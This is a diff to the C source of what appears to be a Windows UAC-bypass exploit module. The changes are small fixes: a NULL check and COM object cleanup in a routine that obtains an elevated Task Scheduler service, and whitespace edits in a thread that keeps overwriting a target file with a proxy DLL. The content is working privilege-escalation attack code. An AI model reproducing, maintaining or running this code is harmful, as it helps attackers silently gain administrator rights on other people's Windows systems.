@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2024
+*  (C) COPYRIGHT AUTHORS, 2020 - 2025
 *
 *  TITLE:       ZCGONVH.C
 *
-*  VERSION:     3.66
+*  VERSION:     3.69
 *
-*  DATE:        03 Apr 2024
+*  DATE:        07 Jul 2025
 *
 *  UAC bypass methods based on zcgonvh original work.
 *
@@ -65,13 +65,19 @@ BOOL ucmxGetElevatedFactoryServerAndTaskService(
         if (r != S_OK)
             break;
 
+        if (pElevatedServer == NULL) {
+            r = E_OUTOFMEMORY;
+            break;
+        }
+
         r = pElevatedServer->lpVtbl->ServerCreateElevatedObject(pElevatedServer,
             &CLSID_TaskScheduler,
             &IID_ITaskService,
             (void**)&pService);
 
-        if (r != S_OK)
+        if (r != S_OK) {
             break;
+        }
 
         if (pService == NULL) {
             r = E_OUTOFMEMORY;
@@ -82,6 +88,13 @@ BOOL ucmxGetElevatedFactoryServerAndTaskService(
         *TaskService = pService;
 
     } while (FALSE);
+
+    if (FAILED(r)) {
+        if (pElevatedServer) {
+            pElevatedServer->lpVtbl->Release(pElevatedServer);
+            pElevatedServer = NULL;
+        }
+    }
 
     return SUCCEEDED(r);
 }
@@ -327,11 +340,9 @@ DWORD ucmxOverwriteThread(
     RtlCopyMemory(&params, Parameter, sizeof(UCMX_OVP));
 
     while (TRUE) {
-
         if (TerminateOverwriteThread) {
             break;
         }
-
         hTargetFile = CreateFile(params.TargetFile,
             GENERIC_WRITE,
             FILE_SHARE_VALID_FLAGS,
@@ -341,12 +352,9 @@ DWORD ucmxOverwriteThread(
             NULL);
 
         if (hTargetFile != INVALID_HANDLE_VALUE) {
-
             WriteFile(hTargetFile, params.ProxyDll, params.ProxyDllSize, &bytesIO, NULL);
             CloseHandle(hTargetFile);
-
         }
-
     }
 
     supHeapFree(Parameter);
